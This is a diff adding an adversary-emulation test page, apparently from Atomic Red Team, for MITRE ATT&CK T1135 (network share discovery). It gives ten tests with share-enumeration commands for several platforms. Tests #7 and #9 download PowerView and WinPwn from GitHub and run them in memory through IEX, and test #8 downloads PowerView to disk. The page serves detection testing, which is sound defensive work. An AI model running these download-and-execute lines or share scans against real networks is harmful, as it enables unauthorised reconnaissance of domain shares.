@@ -1,0 +1,376 @@
+---
+tags: [T1135, atomic_test]
+filename: "[[T1135 - Network Share Discovery]]"
+---
+# T1135 - Network Share Discovery
+
+## Atomic Test #1 - Network Share Discovery
+Network Share Discovery
+
+**Supported Platforms:** macOS
+
+
+**auto_generated_guid:** f94b5ad9-911c-4eff-9718-fd21899db4f7
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| computer_name | Computer name to find a mount on. | string | computer1|
+
+
+#### Attack Commands: Run with `sh`! 
+
+
+```sh
+df -aH
+smbutil view -g //#{computer_name}
+showmount #{computer_name}
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #2 - Network Share Discovery - linux
+Network Share Discovery using smbstatus
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** 875805bc-9e86-4e87-be86-3a5527315cae
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| package_checker | Package checking command. Debian - dpkg -s samba | string | (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)|
+| package_installer | Package installer command. Debian - apt install samba | string | (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)|
+
+
+#### Attack Commands: Run with `bash`!  Elevation Required (e.g. root or admin) 
+
+
+```bash
+sudo smbstatus --shares
+```
+
+
+
+
+#### Dependencies:  Run with `bash`!
+##### Description: Package with smbstatus (samba) must exist on device
+##### Check Prereq Commands:
+```bash
+if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
+```
+##### Get Prereq Commands:
+```bash
+sudo #{package_installer}
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #3 - Network Share Discovery - FreeBSD
+Network Share Discovery using smbstatus
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** 77e468a6-3e5c-45a1-9948-c4b5603747cb
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| package_checker | Package checking command. pkg info -x samba | string | (pkg info -x samba &>/dev/null)|
+| package_installer | Package installer command. pkg install -y samba413 | string | (which pkg && pkg install -y samba413)|
+
+
+#### Attack Commands: Run with `sh`!  Elevation Required (e.g. root or admin) 
+
+
+```sh
+smbstatus --shares
+```
+
+
+
+
+#### Dependencies:  Run with `sh`!
+##### Description: Package with smbstatus (samba) must exist on device
+##### Check Prereq Commands:
+```sh
+if #{package_checker} > /dev/null; then exit 0; else exit 1; fi
+```
+##### Get Prereq Commands:
+```sh
+#{package_installer}
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #4 - Network Share Discovery command prompt
+Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
+Upon execution avalaible network shares will be displayed in the powershell session
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 20f1097d-81c1-405c-8380-32174d493bbb
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| computer_name | Computer name to find a mount on. | string | localhost|
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+net view \\#{computer_name}
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #5 - Network Share Discovery PowerShell
+Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
+Upon execution, avalaible network shares will be displayed in the powershell session
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 1b0814d1-bb24-402d-9615-1b20c50733fb
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+get-smbshare
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #6 - View available share drives
+View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** ab39a04f-0c93-4540-9ff2-83f862c385ae
+
+
+
+
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+net share
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #7 - Share Discovery with PowerView
+Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** b1636f0a-ba82-435c-b699-0d78794d8bfd
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
+```
+
+
+
+
+#### Dependencies:  Run with `powershell`!
+##### Description: Endpoint must be joined to domain
+##### Check Prereq Commands:
+```powershell
+if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+"Join system to domain"
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #8 - PowerView ShareFinder
+PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** d07e4cc1-98ae-447e-9d31-36cb430d28c4
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| parameters | ShareFinder parameter | string | -CheckShareAccess|
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
+Invoke-ShareFinder #{parameters}
+```
+
+
+
+
+#### Dependencies:  Run with `powershell`!
+##### Description: Invoke-ShareFinder module must exist in %TEMP% directory
+##### Check Prereq Commands:
+```powershell
+if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1") {exit 0} else {exit 1}
+```
+##### Get Prereq Commands:
+```powershell
+New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest "https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"
+```
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #9 - WinPwn - shareenumeration
+Network share enumeration using the shareenumeration function of WinPwn
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 987901d1-5b87-4558-a6d9-cffcabc638b8
+
+
+
+
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+shareenumeration -noninteractive -consoleoutput
+```
+
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #10 - Network Share Discovery via dir command
+Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip
+Upon execution avalaible network shares will be displayed in the commandline session
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** 13daa2cf-195a-43df-a8bd-7dd5ffb607b5
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| computer_ip | Computer IP to find a mount on. | string | 127.0.0.1|
+
+
+#### Attack Commands: Run with `command_prompt`! 
+
+
+```cmd
+dir \\#{computer_ip}\c$
+dir \\#{computer_ip}\admin$
+dir \\#{computer_ip}\IPC$
+```
+
+
+
+
+
+
+<br/>
